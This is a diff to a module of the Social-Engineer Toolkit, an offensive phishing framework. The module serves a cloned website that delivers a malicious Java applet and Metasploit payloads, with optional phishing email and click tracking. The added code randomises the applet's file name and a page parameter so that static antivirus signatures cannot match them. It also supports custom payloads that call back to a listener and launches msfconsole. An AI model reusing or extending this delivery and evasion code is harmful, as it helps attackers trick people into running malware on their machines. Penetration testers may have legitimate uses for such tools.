@@ -16,6 +16,33 @@ import datetime
 # see if we are tracking emails
 track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 
+# grab the randomized applet name
+applet_name = check_options("APPLET_NAME=")
+if applet_name == "":
+	applet_name = generate_random_string(6, 15) + ".jar"
+	update_options("APPLET_NAME=" + applet_name)
+
+# define if we are using a custom payload
+custom = 0
+if check_options("CUSTOM_EXE="): 
+	custom = 1
+	print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
+	print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
+	print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
+
+        # here we need to modify the java applet to recognize custom attribute
+        fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
+        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
+        data = fileopen3.read()
+
+	# we randomize param name so static sigs cant be used
+	goat_random = generate_random_string(4, 4)
+        data = data.replace('param name="8" value="YES"', 'param name="8" value="%s"' % (goat_random))
+        filewrite.write(data)
+        filewrite.close()
+	subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), shell=True).wait()
+
+
 # set current path
 definepath=os.getcwd()
 
@@ -54,6 +81,7 @@ def web_server_start():
     apache_check = check_config("APACHE_SERVER=").lower()
     if apache_check == "on" or track_email == "on":
         apache_path = check_config("APACHE_DIRECTORY=")
+	if os.path.isdir(apache_path + "/html"): apache_path = apache_path + "/html"
         apache = 1
         if operating_system == "windows": apache = 0
 
@@ -157,9 +185,9 @@ def web_server_start():
             counter=0
             for line in fileopen:
                 counter=0
-                match=re.search("Signed_Update.jar", line)
+                match=re.search(applet_name, line)
                 if match:
-                    line=line.replace("Signed_Update.jar", "invalid.jar")
+                    line=line.replace(applet_name, "invalid.jar")
                     filewrite.write(line)
                     counter=1
                 match2=re.search("<head>", line)
@@ -182,9 +210,9 @@ def web_server_start():
             if attack_vector != 'hijacking':
                 print bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC
                 # copy all the files needed
-                if not os.path.isfile(setdir + "/Signed_Update.jar"):
-                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/Signed_Update.jar" % (setdir))
-                shutil.copyfile(setdir + "/Signed_Update.jar", "%s/web_clone/Signed_Update.jar" % (setdir))
+                if not os.path.isfile(setdir + "/" + applet_name):
+                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/%s" % (setdir,applet_name))
+                shutil.copyfile(setdir + "/%s" % (applet_name), "%s/web_clone/%s" % (setdir,applet_name))
                 if os.path.isfile("%s/src/html/nix.bin" % (definepath)):
                     nix = check_options("NIX.BIN=")
                     shutil.copyfile("%s/src/html/nix.bin" % (definepath), "%s/web_clone/%s" % (setdir, nix))
@@ -287,7 +315,7 @@ def web_server_start():
                             break
 
     if apache == 1:
-        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/Signed* %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,setdir,apache_path,setdir,apache_path,setdir,apache_path), shell=True).wait()
+        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/*.jar %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,setdir,apache_path,setdir,apache_path,setdir,apache_path), shell=True).wait()
         # if we are tracking users
         if track_email == "on":
             now=datetime.datetime.today()
@@ -373,7 +401,7 @@ try:
                             try:
                                 ipaddr.connect(('localhost', web_port))
                                 if ipaddr:
-                                    print_warning("If you want to use Apache, edit the config/set_config")
+                                    print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config")
                                     print_error("Exit whatever is listening and restart SET")
                                     exit_set()
 
@@ -382,11 +410,11 @@ try:
                                 print_status("Success! Apache was stopped. Moving forward within SET...")
                         # if we don't want to stop apache then exit SET and flag user
                         if apache_stop.lower() == "n" or apache_stop.lower() == "no":
-                            print_warning("If you want to use Apache, edit the config/set_config and turn apache on")
+                            print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config and turn apache on")
                             print_error("Exit whatever is lsitening or turn Apache on in set_config and restart SET")
                             exit_set()
                     else:
-                        print_warning("If you want to use Apache, edit the config/set_config")
+                        print_warning("If you want to use Apache, edit the /etc/setoolkit/set.config")
                         print_error("Exit whatever is listening and restart SET")
                         exit_set()
 
@@ -412,7 +440,7 @@ except Exception, e:
     # if we are using apache
     if apache == 1:
         print_error("Error:Apache does not appear to be running.")
-        print_error("Start it or turn APACHE off in config/set_config")
+        print_error("Start it or turn APACHE off in /etc/setoolkit/set.config")
         print_status("Attempting to start Apache manually...")
         apache_counter = 0
 
@@ -486,14 +514,18 @@ try:
             meta_config = "meta_config"
             if os.path.isfile(setdir + "/meta_config_multipyinjector"):
                 meta_config = "meta_config_multipyinjector"
-            child1=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/%s" % (msf_path,setdir,meta_config))
-        # check if we want to deliver emails or track users that click the link
-        webattack_email = check_config("WEBATTACK_EMAIL=").lower()
-        if webattack_email == "on" or track_email == "on":
-            try: reload(src.phishing.smtp.client.smtp_web)
-            except: import src.phishing.smtp.client.smtp_web
+	    # if we arent using a custom payload
+	    if custom != 1:
+	            child1=pexpect.spawn("%smsfconsole -r %s/%s\r\n\r\n" % (msf_path,setdir,meta_config))
+            # check if we want to deliver emails or track users that click the link
+            webattack_email = check_config("WEBATTACK_EMAIL=").lower()
+            if webattack_email == "on" or track_email == "on":
+            	try: reload(src.phishing.smtp.client.smtp_web)
+            	except: import src.phishing.smtp.client.smtp_web
 
-        child1.interact()
+	# if we arent using a custom payload
+        if custom != 1:
+	        child1.interact()
 
     if os.path.isfile(setdir + "/set.payload"):
         port = check_options("PORT=")
@@ -559,7 +591,7 @@ except KeyboardInterrupt:
 if automatic_listener == "off" or multiattack== "on":
 
     if automatic_listener == "off":
-        print_warning("Listener is turned off in config/set_config!")
+        print_warning("Listener is turned off in /etc/setoolkit/set.config!")
     if automatic_listener == "off" or template == "CUSTOM" or template == "SELF":
 
         while 1:
